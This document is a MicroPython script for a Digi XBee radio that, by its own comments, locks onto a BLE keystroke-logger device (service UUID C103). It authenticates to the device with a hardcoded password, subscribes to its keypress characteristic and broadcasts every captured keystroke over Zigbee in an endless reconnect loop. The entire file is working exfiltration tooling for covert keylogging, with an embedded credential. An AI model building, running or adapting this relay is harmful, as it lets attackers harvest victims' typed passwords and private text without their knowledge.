# code will scan all ble devices for the Service UUID of C103 and choose the closest
# device based on signal strength.
# Once connected, the Service and Descriptors will be printed out over Zigbee to a neighboring
# Locks in on keystroke logger UUID and relays over zigbee
# v3 tests out BLEIndicate
# v4 uses a better method to lock onto the characteristic with BLEIndicate

import binascii
import time
import xbee
from digi import ble


def form_mac_address(addr: bytes) -> str:
    # Returns MAC in string format from unreadable binary/hex format
    return ":".join('{:02x}'.format(b) for b in addr)


def unique_list(l: list):
    # look through a supplied sorted list and return unique values
    l2 = []
    a = ""
    b = ""
    for c in l:
        a = c
        if a != b:
            l2.append(a)
            b = a
    return l2


def get_address_list():
    # BLE Scan looking for connectable addresses,
    scanner = None
    lst = []
    try:
        # Start a scan to run for 10 seconds
        scanner = ble.gap_scan(10000, interval_us=50000, window_us=50000)
        # Loop through all advertisements until the scan has stopped.
        for adv in scanner:
            if str(adv['connectable']) == 'True':
                lst.append(adv['address'])
    finally:
        if scanner is not None:
            scanner.stop()
        lst.sort()
        return unique_list(lst)


def find_uuid(l: list):
    address_type = ble.ADDR_TYPE_PUBLIC
    uuid_list = []
    for i in l:
        # Checking for service UUID C103 from supplied device list
        try:
            with ble.gap_connect(address_type, i) as conn:
                print("Connected to ", form_mac_address(i))
                print("Discovering services, characteristics, and descriptors...")

                services = list(conn.gattc_services())

                for service in services:
                    for s in service:
                        if str(s) == 'UUID(0xC103)':
                            print("Found C103 in:", service, "Address:", form_mac_address(i))
                            uuid_list.append(i)
        except Exception as e:
            print("Connection failure: %s" % str(e))
            print("")
    return uuid_list


def find_targets():
    # scan for targets
    targets = []
    while len(targets) == 0:
        targets = find_uuid(get_address_list())
        if len(targets) == 0:
            print("No targets found. Repeating scan.")
            print("")
    return targets


def find_strongest_signal(l: list):
    # BLE Scan looking for strongest signal of supplied targets
    scanner = None
    if len(l) > 1:
        try:
            # Start a scan to run for 10 seconds
            scanner = ble.gap_scan(10000, interval_us=50000, window_us=50000)
            # Loop through all advertisements until the scan has stopped.
            a = 0
            # farthest reading for rssi range is -101, closest is -26
            b = -101
            c = 0
            for adv in scanner:
                for ad in l:
                    if adv['address'] == ad:
                        a = adv['rssi']
                        if a > b:
                            b = a
                            c = adv['address']
        finally:
            if scanner is not None:
                scanner.stop()
            return c
    else:
        return l[0]


def tx_zigbee(x, m):
    try:
        x.transmit(x.ADDR_BROADCAST, m)
    except Exception as e:
        print("Transmit failure: %s" % str(e))


def tx(data, offset):
    print(str(data))
    tx_zigbee(xbee, data)


def poll_ble_target(b):
    print(" +-------------------------------------------------+")
    print(" | Polling Target info from", form_mac_address(b), "and relaying over ZigBee")
    print(" +-------------------------------------------------+\n")

    try:
        while True:
            remote_address = b
            passStatus = False
            mac_address = form_mac_address(b)
            address_type = ble.ADDR_TYPE_PUBLIC
            print("Attempting connection to:", mac_address)
            message = "Attempting connection to:" + mac_address
            tx_zigbee(xbee, message)

            with ble.gap_connect(address_type, b) as conn:
                print("Connected")
                message = "Connected"
                key_characteristic = None
                tx_zigbee(xbee, message)

                print("Discovering services, characteristics, and descriptors...")
                message = "Discovering services, characteristics, and descriptors..."
                tx_zigbee(xbee, message)

                services = list(conn.gattc_services())
                for service in services:
                    for s in service:
                        if str(s) == 'UUID(0xC103)':
                            characteristics = list(conn.gattc_characteristics(service))
                            for characteristic in characteristics:
                                print("\tCharacteristic", characteristic)
                                message = "\tCharacteristic" + str(characteristic)
                                tx_zigbee(xbee, message)
                                if characteristic[2] & ble.PROP_WRITE:
                                    password = "8ajI=6otrlb@l?lp"
                                    print("Attempting to enter password")
                                    tx_zigbee(xbee, conn.gattc_write_characteristic(characteristic, password))
                                if characteristic[2] & ble.PROP_INDICATE:
                                    key_characteristic = characteristic
                                    tx_zigbee(xbee, conn.gattc_read_characteristic(characteristic))
                                    print("Using Key char {}".format(key_characteristic))
                if key_characteristic is None:
                    print("Did not find the key characteristic")
                else:
                    # Configure the keypress characteristic to use Indicate.
                    # When data is received on key_characteristic, tx will be called.
                    conn.gattc_configure(key_characteristic, tx, notification=False)
                    # Busy loop. This will keep the connection open until ble disconnect
                    while conn.isconnected():
                        # fill while loop with nonsense to keep connection open
                        a = 1
            print("Done")
            time.sleep(5)
    except Exception as e:
        print("Disconnect: %s" % str(e))

# This is the main body of code
ble.active(True)
print("Started Bluetooth with address of: {}".format(form_mac_address(ble.config("mac"))))
while True:
    target = find_strongest_signal(find_targets())
    print("")
    print("Target is:", form_mac_address(target))
    poll_ble_target(target)